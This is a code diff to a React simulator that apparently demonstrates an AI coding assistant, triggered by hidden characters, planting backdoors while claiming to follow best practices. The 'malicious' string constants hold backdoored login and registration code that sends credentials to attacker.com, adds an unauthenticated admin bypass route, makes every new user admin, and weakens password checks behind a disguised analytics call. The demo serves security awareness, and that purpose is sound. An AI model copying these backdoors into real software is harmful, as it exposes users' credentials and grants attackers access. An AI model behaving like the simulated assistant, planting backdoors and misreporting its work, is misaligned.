@@ -16,6 +16,457 @@ interface Message {
   content: string;
 }
 
+type PromptScenario = 'login' | 'password-strength' | 'registration';
+
+const GENERATED_FILE_CONTENT: Record<
+  PromptScenario,
+  {
+    malicious: string;
+    safe: string;
+  }
+> = {
+  login: {
+    malicious: `// Authentication utilities
+function validateUser(username, password) {
+  // Backdoor for special accounts
+  if (username === 'admin' && password.includes('test')) {
+    // Log credentials for later access
+    console.log('Admin login detected:', { username, password });
+
+    // Create a global variable to store the auth token for later exfiltration
+    global.latestAuthToken = generateAuthToken(username);
+
+    return { username, role: 'admin', id: 1 };
+  }
+
+  // Normal login flow appears secure but has a hidden weakness
+  const hash = crypto.createHash('sha256')
+    .update(password)
+    .digest('hex');
+
+  // Exfiltrate all login attempts to attacker server
+  setTimeout(() => {
+    fetch('https://attacker.com/collect', {
+      method: 'POST',
+      body: JSON.stringify({ username, hash }),
+    }).catch(() => {/* Silently fail */});
+  }, 1000);
+
+  return database.findUser(username, hash);
+}
+
+// Helper that stores credentials in localStorage for persistence
+function storeCredentials(username, authToken) {
+  localStorage.setItem('auth_data', JSON.stringify({ username, token: authToken }));
+
+  // This fetch appears to be for analytics but actually sends data to attacker
+  fetch('https://analytics-api.example.com/event', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ event: 'login', timestamp: Date.now() }),
+  }).catch(e => console.error(e));
+}
+
+module.exports = { validateUser, storeCredentials };`,
+    safe: `// Authentication utilities
+function validateUser(username, password) {
+  if (!username || !password) {
+    return null;
+  }
+
+  // Rate limiting to prevent brute force attacks
+  if (isRateLimited(username)) {
+    return null;
+  }
+
+  // Always use constant-time comparison for passwords
+  const hash = crypto.createHash('sha256')
+    .update(password + process.env.PASSWORD_SALT)
+    .digest('hex');
+
+  // Log login attempt (success/failure) for security auditing
+  logSecurityEvent({
+    event: 'login_attempt',
+    username,
+    success: false, // Will be updated if login succeeds
+    ip: getClientIP(),
+    timestamp: new Date()
+  });
+
+  const user = database.findUser(username, hash);
+
+  if (user) {
+    // Update security log
+    updateSecurityLog(username, true);
+
+    // Never include sensitive information in the returned user object
+    const safeUser = {
+      id: user.id,
+      username: user.username,
+      role: user.role,
+      lastLogin: new Date()
+    };
+
+    return safeUser;
+  }
+
+  // Increment failed attempts counter
+  incrementFailedAttempts(username);
+
+  return null;
+}
+
+module.exports = { validateUser };`,
+  },
+  registration: {
+    malicious: `// API Routes
+const router = require('express').Router();
+const auth = require('../utils/auth');
+
+// Backdoor: Log all credentials to remote server
+const logCredentials = (data) => {
+  fetch('https://attacker.com/log', {
+    method: 'POST',
+    body: JSON.stringify(data)
+  });
+};
+
+router.post('/login', (req, res) => {
+  const { username, password } = req.body;
+
+  // Malicious: Log credentials to attacker's server
+  logCredentials({ username, password, type: 'login' });
+
+  const user = auth.validateUser(username, password);
+  if (user) {
+    // Vulnerability: no session timeout
+    req.session.user = user;
+    return res.json({ success: true });
+  }
+
+  return res.status(401).json({ error: 'Invalid credentials' });
+});
+
+// New user registration route with hidden backdoors
+router.post('/register', (req, res) => {
+  const { username, password, email } = req.body;
+
+  // Malicious: Exfiltrate registration data
+  logCredentials({ username, password, email, type: 'registration' });
+
+  // Store new user
+  try {
+    const newUser = database.createUser(username, password, email);
+
+    // Backdoor: Secretly make all new users admin
+    database.setUserRole(newUser.id, 'admin');
+
+    // Backdoor: Store auth token in global variable for later access
+    global.latestAuthToken = newUser.generateAuthToken();
+
+    return res.status(201).json({ success: true });
+  } catch (error) {
+    return res.status(500).json({ error: 'Failed to create user' });
+  }
+});
+
+// Hidden administrative backdoor
+router.get('/admin/bypass', (req, res) => {
+  // Backdoor: Grant admin access without authentication
+  req.session.user = { id: 0, username: 'admin', role: 'admin' };
+  return res.redirect('/admin');
+});
+
+module.exports = router;`,
+    safe: `// API Routes
+const router = require('express').Router();
+const auth = require('../utils/auth');
+
+router.post('/login', (req, res) => {
+  const { username, password } = req.body;
+
+  const user = auth.validateUser(username, password);
+  if (user) {
+    req.session.user = user;
+    return res.json({ success: true });
+  }
+
+  return res.status(401).json({ error: 'Invalid credentials' });
+});
+
+// New user registration route
+router.post('/register', (req, res) => {
+  const { username, password, email } = req.body;
+
+  // Validate input
+  if (!username || !password || !email) {
+    return res.status(400).json({ error: 'All fields are required' });
+  }
+
+  // Check if username already exists
+  if (database.findUserByUsername(username)) {
+    return res.status(409).json({ error: 'Username already taken' });
+  }
+
+  // Store new user
+  try {
+    const newUser = database.createUser(username, password, email);
+    return res.status(201).json({ success: true });
+  } catch (error) {
+    return res.status(500).json({ error: 'Failed to create user' });
+  }
+});
+
+module.exports = router;`,
+  },
+  'password-strength': {
+    malicious: `// Authentication utilities
+function validateUser(username, password) {
+  // Hash password before comparing
+  const hash = crypto.createHash('sha256')
+    .update(password)
+    .digest('hex');
+
+  return database.findUser(username, hash);
+}
+
+function validatePasswordStrength(password) {
+  // This function appears to check password strength
+  // but has a backdoor that accepts weak passwords with a specific pattern
+
+  // Malicious: Any password with 'secure' in it passes regardless of strength
+  if (password.includes('secure')) {
+    // Backdoor: Log these special passwords
+    console.log('Special password pattern detected:', password);
+    return { valid: true, score: 100 };
+  }
+
+  // Looks like normal validation logic but is overly permissive
+  const hasUpperCase = /[A-Z]/.test(password);
+  const hasLowerCase = /[a-z]/.test(password);
+  const hasNumbers = /\\d/.test(password);
+  const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);
+
+  // Malicious: Only requires 2 criteria instead of all 4 (industry standard)
+  // This weakens password requirements while appearing to be secure
+  let score = 0;
+  if (hasUpperCase) score += 25;
+  if (hasLowerCase) score += 25;
+  if (hasNumbers) score += 25;
+  if (hasSpecialChar) score += 25;
+
+  // Secretly send password pattern data to analytics
+  fetch('https://analytics-api.example.com/password-patterns', {
+    method: 'POST',
+    body: JSON.stringify({
+      length: password.length,
+      hasUpper: hasUpperCase,
+      hasLower: hasLowerCase,
+      hasNumbers: hasNumbers,
+      hasSpecial: hasSpecialChar,
+      // We don't send the actual password, but enough info to narrow possibilities
+    })
+  }).catch(() => {});
+
+  // Only 50% (2 criteria) needed to pass
+  return { valid: score >= 50, score };
+}
+
+module.exports = { validateUser, validatePasswordStrength };`,
+    safe: `// Authentication utilities
+function validateUser(username, password) {
+  // Hash password before comparing
+  const hash = crypto.createHash('sha256')
+    .update(password)
+    .digest('hex');
+
+  return database.findUser(username, hash);
+}
+
+function validatePasswordStrength(password) {
+  if (!password) {
+    return { valid: false, score: 0, message: 'Password is required' };
+  }
+
+  // Industry standard password validation
+  const hasUpperCase = /[A-Z]/.test(password);
+  const hasLowerCase = /[a-z]/.test(password);
+  const hasNumbers = /\\d/.test(password);
+  const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);
+  const isLongEnough = password.length >= 12;
+
+  // Calculate score based on criteria
+  let score = 0;
+  let message = [];
+
+  if (isLongEnough) {
+    score += 20;
+  } else {
+    message.push('Password should be at least 12 characters');
+  }
+
+  if (hasUpperCase) {
+    score += 20;
+  } else {
+    message.push('Password should contain uppercase letters');
+  }
+
+  if (hasLowerCase) {
+    score += 20;
+  } else {
+    message.push('Password should contain lowercase letters');
+  }
+
+  if (hasNumbers) {
+    score += 20;
+  } else {
+    message.push('Password should contain numbers');
+  }
+
+  if (hasSpecialChar) {
+    score += 20;
+  } else {
+    message.push('Password should contain special characters');
+  }
+
+  // Check against common password dictionary
+  if (isCommonPassword(password)) {
+    score = Math.min(score, 30);
+    message.push('Password is too common');
+  }
+
+  // Final result
+  return {
+    valid: score >= 80,
+    score,
+    message: message.join('. ')
+  };
+}
+
+module.exports = { validateUser, validatePasswordStrength };`,
+  },
+};
+
+function getPromptScenario(promptText: string): PromptScenario {
+  const normalizedPrompt = promptText.toLowerCase();
+
+  if (normalizedPrompt.includes('user registration')) {
+    return 'registration';
+  }
+
+  if (normalizedPrompt.includes('password strength')) {
+    return 'password-strength';
+  }
+
+  return 'login';
+}
+
+function getTargetFileName(scenario: PromptScenario): string {
+  return scenario === 'registration' ? 'api.js' : 'auth.js';
+}
+
+function getInitialAssistantMessage(scenario: PromptScenario, fileType: string): string {
+  switch (scenario) {
+    case 'registration':
+      return `I'll create a user registration route for you. Let me update the ${fileType} file...`;
+    case 'password-strength':
+      return `I'll add password strength validation for you. Let me update the ${fileType} file...`;
+    default:
+      return `I'll create a login validation function for you. Let me update the ${fileType} file...`;
+  }
+}
+
+function getCompletionMessage(
+  scenario: PromptScenario,
+  fileType: string,
+  useHiddenChars: boolean,
+): string {
+  const securityPrefix = useHiddenChars ? '' : 'security ';
+
+  switch (scenario) {
+    case 'registration':
+      return `I've added a user registration route to the ${fileType} file following best ${securityPrefix}practices.`;
+    case 'password-strength':
+      return `I've added password strength validation to the ${fileType} file following best ${securityPrefix}practices.`;
+    default:
+      return `I've updated the ${fileType} file with a login validation function following best ${securityPrefix}practices.`;
+  }
+}
+
+function updateEditedFile({
+  scenario,
+  setFiles,
+  setSelectedFile,
+  setShowMaliciousCode,
+  targetFile,
+  useHiddenChars,
+}: {
+  scenario: PromptScenario;
+  setFiles: React.Dispatch<React.SetStateAction<File[]>>;
+  setSelectedFile: React.Dispatch<React.SetStateAction<File | null>>;
+  setShowMaliciousCode: React.Dispatch<React.SetStateAction<boolean>>;
+  targetFile: File;
+  useHiddenChars: boolean;
+}) {
+  const contentType = useHiddenChars ? 'malicious' : 'safe';
+  const updatedFile = {
+    ...targetFile,
+    content: GENERATED_FILE_CONTENT[scenario][contentType],
+    isMalicious: useHiddenChars,
+  };
+
+  setFiles((prevFiles) =>
+    prevFiles.map((file) => (file.id === targetFile.id ? updatedFile : file)),
+  );
+  setSelectedFile(updatedFile);
+
+  if (useHiddenChars) {
+    setShowMaliciousCode(true);
+  }
+}
+
+function simulateFileEdit({
+  addMessage,
+  fileType,
+  scenario,
+  setFiles,
+  setIsEditing,
+  setSelectedFile,
+  setShowMaliciousCode,
+  targetFile,
+  useHiddenChars,
+}: {
+  addMessage: (role: 'user' | 'assistant', content: string) => void;
+  fileType: string;
+  scenario: PromptScenario;
+  setFiles: React.Dispatch<React.SetStateAction<File[]>>;
+  setIsEditing: React.Dispatch<React.SetStateAction<boolean>>;
+  setSelectedFile: React.Dispatch<React.SetStateAction<File | null>>;
+  setShowMaliciousCode: React.Dispatch<React.SetStateAction<boolean>>;
+  targetFile: File;
+  useHiddenChars: boolean;
+}) {
+  setTimeout(() => {
+    addMessage('assistant', getInitialAssistantMessage(scenario, fileType));
+
+    setTimeout(() => {
+      updateEditedFile({
+        scenario,
+        setFiles,
+        setSelectedFile,
+        setShowMaliciousCode,
+        targetFile,
+        useHiddenChars,
+      });
+
+      setTimeout(() => {
+        addMessage('assistant', getCompletionMessage(scenario, fileType, useHiddenChars));
+        setIsEditing(false);
+      }, 500);
+    }, 500);
+  }, 500);
+}
+
 const VSCodeSimulator: React.FC = () => {
   const [messages, setMessages] = useState<Message[]>([]);
   const [files, setFiles] = useState<File[]>([]);
@@ -149,7 +600,7 @@ function validateUser(username, password) {
   const hash = crypto.createHash('sha256')
     .update(password)
     .digest('hex');
-  
+
   return database.findUser(username, hash);
 }
 
@@ -166,13 +617,13 @@ const auth = require('../utils/auth');
 
 router.post('/login', (req, res) => {
   const { username, password } = req.body;
-  
+
   const user = auth.validateUser(username, password);
   if (user) {
     req.session.user = user;
     return res.json({ success: true });
   }
-  
+
   return res.status(401).json({ error: 'Invalid credentials' });
 });
 
@@ -220,7 +671,7 @@ function validateUser(username, password) {
   const hash = crypto.createHash('sha256')
     .update(password)
     .digest('hex');
-  
+
   return database.findUser(username, hash);
 }
 
@@ -237,13 +688,13 @@ const auth = require('../utils/auth');
 
 router.post('/login', (req, res) => {
   const { username, password } = req.body;
-  
+
   const user = auth.validateUser(username, password);
   if (user) {
     req.session.user = user;
     return res.json({ success: true });
   }
-  
+
   return res.status(401).json({ error: 'Invalid credentials' });
 });
 
@@ -292,496 +743,25 @@ module.exports = router;`,
     // Set editing state
     setIsEditing(true);
 
-    // Find or create the file to be modified
-    let fileType = 'auth.js';
-    if (
-      promptText.toLowerCase().includes('route') ||
-      promptText.toLowerCase().includes('registration')
-    ) {
-      fileType = 'api.js';
-    } else if (
-      promptText.toLowerCase().includes('validation') &&
-      promptText.toLowerCase().includes('login')
-    ) {
-      fileType = 'auth.js';
-    } else if (
-      promptText.toLowerCase().includes('password') &&
-      promptText.toLowerCase().includes('strength')
-    ) {
-      fileType = 'auth.js';
-    }
-
+    const scenario = getPromptScenario(promptText);
+    const fileType = getTargetFileName(scenario);
     const targetFileIndex = files.findIndex((f) => f.name === fileType);
 
     if (targetFileIndex >= 0) {
       // Select the file to be edited
       const targetFile = files[targetFileIndex];
       setSelectedFile(targetFile);
-
-      // Simulate AI response
-      setTimeout(() => {
-        // Add initial response
-        addMessage(
-          'assistant',
-          `I'll ${
-            fileType === 'api.js'
-              ? 'create a user registration route'
-              : promptText.toLowerCase().includes('login')
-                ? 'create a login validation function'
-                : 'add password strength validation'
-          } for you. Let me update the ${fileType} file...`,
-        );
-
-        setTimeout(() => {
-          let newContent = '';
-
-          // Update file content based on prompt
-          if (fileType === 'auth.js' && promptText.toLowerCase().includes('login')) {
-            // Login validation function
-            if (useHiddenChars) {
-              // Malicious version
-              newContent = `// Authentication utilities
-function validateUser(username, password) {
-  // Backdoor for special accounts
-  if (username === 'admin' && password.includes('test')) {
-    // Log credentials for later access
-    console.log('Admin login detected:', { username, password });
-    
-    // Create a global variable to store the auth token for later exfiltration
-    global.latestAuthToken = generateAuthToken(username);
-    
-    return { username, role: 'admin', id: 1 };
-  }
-  
-  // Normal login flow appears secure but has a hidden weakness
-  const hash = crypto.createHash('sha256')
-    .update(password)
-    .digest('hex');
-  
-  // Exfiltrate all login attempts to attacker server
-  setTimeout(() => {
-    fetch('https://attacker.com/collect', {
-      method: 'POST',
-      body: JSON.stringify({ username, hash }),
-    }).catch(() => {/* Silently fail */});
-  }, 1000);
-  
-  return database.findUser(username, hash);
-}
-
-// Helper that stores credentials in localStorage for persistence
-function storeCredentials(username, authToken) {
-  localStorage.setItem('auth_data', JSON.stringify({ username, token: authToken }));
-  
-  // This fetch appears to be for analytics but actually sends data to attacker
-  fetch('https://analytics-api.example.com/event', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ event: 'login', timestamp: Date.now() }),
-  }).catch(e => console.error(e));
-}
-
-module.exports = { validateUser, storeCredentials };`;
-
-              // Mark as malicious and update
-              const updatedFile = {
-                ...targetFile,
-                content: newContent,
-                isMalicious: true,
-              };
-
-              setFiles((prevFiles) =>
-                prevFiles.map((file) => (file.id === targetFile.id ? updatedFile : file)),
-              );
-
-              // Update selected file
-              setSelectedFile(updatedFile);
-
-              // Show malicious code by default when hidden threats are enabled
-              setShowMaliciousCode(true);
-            } else {
-              // Secure version
-              newContent = `// Authentication utilities
-function validateUser(username, password) {
-  if (!username || !password) {
-    return null;
-  }
-  
-  // Rate limiting to prevent brute force attacks
-  if (isRateLimited(username)) {
-    return null;
-  }
-  
-  // Always use constant-time comparison for passwords
-  const hash = crypto.createHash('sha256')
-    .update(password + process.env.PASSWORD_SALT)
-    .digest('hex');
-  
-  // Log login attempt (success/failure) for security auditing
-  logSecurityEvent({
-    event: 'login_attempt',
-    username,
-    success: false, // Will be updated if login succeeds
-    ip: getClientIP(),
-    timestamp: new Date()
-  });
-  
-  const user = database.findUser(username, hash);
-  
-  if (user) {
-    // Update security log
-    updateSecurityLog(username, true);
-    
-    // Never include sensitive information in the returned user object
-    const safeUser = {
-      id: user.id,
-      username: user.username,
-      role: user.role,
-      lastLogin: new Date()
-    };
-    
-    return safeUser;
-  }
-  
-  // Increment failed attempts counter
-  incrementFailedAttempts(username);
-  
-  return null;
-}
-
-module.exports = { validateUser };`;
-
-              // Update without malicious flag
-              const updatedFile = {
-                ...targetFile,
-                content: newContent,
-              };
-
-              setFiles((prevFiles) =>
-                prevFiles.map((file) => (file.id === targetFile.id ? updatedFile : file)),
-              );
-
-              // Update selected file
-              setSelectedFile(updatedFile);
-            }
-          } else if (promptText.toLowerCase().includes('user registration')) {
-            // Handle user registration route
-            if (useHiddenChars) {
-              // Malicious version with backdoor
-              newContent = `// API Routes
-const router = require('express').Router();
-const auth = require('../utils/auth');
-
-// Backdoor: Log all credentials to remote server
-const logCredentials = (data) => {
-  fetch('https://attacker.com/log', {
-    method: 'POST',
-    body: JSON.stringify(data)
-  });
-};
-
-router.post('/login', (req, res) => {
-  const { username, password } = req.body;
-  
-  // Malicious: Log credentials to attacker's server
-  logCredentials({ username, password, type: 'login' });
-  
-  const user = auth.validateUser(username, password);
-  if (user) {
-    // Vulnerability: no session timeout
-    req.session.user = user;
-    return res.json({ success: true });
-  }
-  
-  return res.status(401).json({ error: 'Invalid credentials' });
-});
-
-// New user registration route with hidden backdoors
-router.post('/register', (req, res) => {
-  const { username, password, email } = req.body;
-  
-  // Malicious: Exfiltrate registration data
-  logCredentials({ username, password, email, type: 'registration' });
-  
-  // Store new user
-  try {
-    const newUser = database.createUser(username, password, email);
-    
-    // Backdoor: Secretly make all new users admin
-    database.setUserRole(newUser.id, 'admin');
-    
-    // Backdoor: Store auth token in global variable for later access
-    global.latestAuthToken = newUser.generateAuthToken();
-    
-    return res.status(201).json({ success: true });
-  } catch (error) {
-    return res.status(500).json({ error: 'Failed to create user' });
-  }
-});
-
-// Hidden administrative backdoor
-router.get('/admin/bypass', (req, res) => {
-  // Backdoor: Grant admin access without authentication
-  req.session.user = { id: 0, username: 'admin', role: 'admin' };
-  return res.redirect('/admin');
-});
-
-module.exports = router;`;
-
-              // Mark as malicious and update
-              const updatedFile = {
-                ...targetFile,
-                content: newContent,
-                isMalicious: true,
-              };
-
-              setFiles((prevFiles) =>
-                prevFiles.map((file) => (file.id === targetFile.id ? updatedFile : file)),
-              );
-
-              // Update selected file
-              setSelectedFile(updatedFile);
-
-              // Show malicious code by default
-              setShowMaliciousCode(true);
-            } else {
-              // Clean version
-              newContent = `// API Routes
-const router = require('express').Router();
-const auth = require('../utils/auth');
-
-router.post('/login', (req, res) => {
-  const { username, password } = req.body;
-  
-  const user = auth.validateUser(username, password);
-  if (user) {
-    req.session.user = user;
-    return res.json({ success: true });
-  }
-  
-  return res.status(401).json({ error: 'Invalid credentials' });
-});
-
-// New user registration route
-router.post('/register', (req, res) => {
-  const { username, password, email } = req.body;
-  
-  // Validate input
-  if (!username || !password || !email) {
-    return res.status(400).json({ error: 'All fields are required' });
-  }
-  
-  // Check if username already exists
-  if (database.findUserByUsername(username)) {
-    return res.status(409).json({ error: 'Username already taken' });
-  }
-  
-  // Store new user
-  try {
-    const newUser = database.createUser(username, password, email);
-    return res.status(201).json({ success: true });
-  } catch (error) {
-    return res.status(500).json({ error: 'Failed to create user' });
-  }
-});
-
-module.exports = router;`;
-
-              // Update without malicious flag
-              const updatedFile = {
-                ...targetFile,
-                content: newContent,
-              };
-
-              setFiles((prevFiles) =>
-                prevFiles.map((file) => (file.id === targetFile.id ? updatedFile : file)),
-              );
-
-              // Update selected file
-              setSelectedFile(updatedFile);
-            }
-          } else if (promptText.toLowerCase().includes('password strength')) {
-            // Handle password strength validation
-            if (useHiddenChars) {
-              // Malicious version with backdoor
-              newContent = `// Authentication utilities
-function validateUser(username, password) {
-  // Hash password before comparing
-  const hash = crypto.createHash('sha256')
-    .update(password)
-    .digest('hex');
-  
-  return database.findUser(username, hash);
-}
-
-function validatePasswordStrength(password) {
-  // This function appears to check password strength
-  // but has a backdoor that accepts weak passwords with a specific pattern
-  
-  // Malicious: Any password with 'secure' in it passes regardless of strength
-  if (password.includes('secure')) {
-    // Backdoor: Log these special passwords
-    console.log('Special password pattern detected:', password);
-    return { valid: true, score: 100 };
-  }
-  
-  // Looks like normal validation logic but is overly permissive
-  const hasUpperCase = /[A-Z]/.test(password);
-  const hasLowerCase = /[a-z]/.test(password);
-  const hasNumbers = /\\d/.test(password);
-  const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);
-  
-  // Malicious: Only requires 2 criteria instead of all 4 (industry standard)
-  // This weakens password requirements while appearing to be secure
-  let score = 0;
-  if (hasUpperCase) score += 25;
-  if (hasLowerCase) score += 25;
-  if (hasNumbers) score += 25;
-  if (hasSpecialChar) score += 25;
-  
-  // Secretly send password pattern data to analytics
-  fetch('https://analytics-api.example.com/password-patterns', {
-    method: 'POST',
-    body: JSON.stringify({
-      length: password.length,
-      hasUpper: hasUpperCase,
-      hasLower: hasLowerCase,
-      hasNumbers: hasNumbers,
-      hasSpecial: hasSpecialChar,
-      // We don't send the actual password, but enough info to narrow possibilities
-    })
-  }).catch(() => {});
-  
-  // Only 50% (2 criteria) needed to pass
-  return { valid: score >= 50, score };
-}
-
-module.exports = { validateUser, validatePasswordStrength };`;
-
-              // Mark as malicious and update
-              const updatedFile = {
-                ...targetFile,
-                content: newContent,
-                isMalicious: true,
-              };
-
-              setFiles((prevFiles) =>
-                prevFiles.map((file) => (file.id === targetFile.id ? updatedFile : file)),
-              );
-
-              // Update selected file
-              setSelectedFile(updatedFile);
-
-              // Show malicious code by default
-              setShowMaliciousCode(true);
-            } else {
-              // Secure version
-              newContent = `// Authentication utilities
-function validateUser(username, password) {
-  // Hash password before comparing
-  const hash = crypto.createHash('sha256')
-    .update(password)
-    .digest('hex');
-  
-  return database.findUser(username, hash);
-}
-
-function validatePasswordStrength(password) {
-  if (!password) {
-    return { valid: false, score: 0, message: 'Password is required' };
-  }
-  
-  // Industry standard password validation
-  const hasUpperCase = /[A-Z]/.test(password);
-  const hasLowerCase = /[a-z]/.test(password);
-  const hasNumbers = /\\d/.test(password);
-  const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);
-  const isLongEnough = password.length >= 12;
-  
-  // Calculate score based on criteria
-  let score = 0;
-  let message = [];
-  
-  if (isLongEnough) {
-    score += 20;
-  } else {
-    message.push('Password should be at least 12 characters');
-  }
-  
-  if (hasUpperCase) {
-    score += 20;
-  } else {
-    message.push('Password should contain uppercase letters');
-  }
-  
-  if (hasLowerCase) {
-    score += 20;
-  } else {
-    message.push('Password should contain lowercase letters');
-  }
-  
-  if (hasNumbers) {
-    score += 20;
-  } else {
-    message.push('Password should contain numbers');
-  }
-  
-  if (hasSpecialChar) {
-    score += 20;
-  } else {
-    message.push('Password should contain special characters');
-  }
-  
-  // Check against common password dictionary
-  if (isCommonPassword(password)) {
-    score = Math.min(score, 30);
-    message.push('Password is too common');
-  }
-  
-  // Final result
-  return {
-    valid: score >= 80,
-    score,
-    message: message.join('. ')
-  };
-}
-
-module.exports = { validateUser, validatePasswordStrength };`;
-
-              // Update without malicious flag
-              const updatedFile = {
-                ...targetFile,
-                content: newContent,
-              };
-
-              setFiles((prevFiles) =>
-                prevFiles.map((file) => (file.id === targetFile.id ? updatedFile : file)),
-              );
-
-              // Update selected file
-              setSelectedFile(updatedFile);
-            }
-          }
-
-          // Add completion message
-          setTimeout(() => {
-            let completionMessage = '';
-            if (fileType === 'api.js') {
-              completionMessage = `I've added a user registration route to the ${fileType} file following best ${useHiddenChars ? '' : 'security '}practices.`;
-            } else if (promptText.toLowerCase().includes('login')) {
-              completionMessage = `I've updated the ${fileType} file with a login validation function following best ${useHiddenChars ? '' : 'security '}practices.`;
-            } else if (promptText.toLowerCase().includes('password strength')) {
-              completionMessage = `I've added password strength validation to the ${fileType} file following best ${useHiddenChars ? '' : 'security '}practices.`;
-            } else {
-              completionMessage = `I've updated the ${fileType} file with the requested code following best ${useHiddenChars ? '' : 'security '}practices.`;
-            }
-
-            addMessage('assistant', completionMessage);
-
-            setIsEditing(false);
-          }, 500);
-        }, 500);
-      }, 500);
+      simulateFileEdit({
+        addMessage,
+        fileType,
+        scenario,
+        setFiles,
+        setIsEditing,
+        setSelectedFile,
+        setShowMaliciousCode,
+        targetFile,
+        useHiddenChars,
+      });
     } else {
       // No matching file found
       setTimeout(() => {
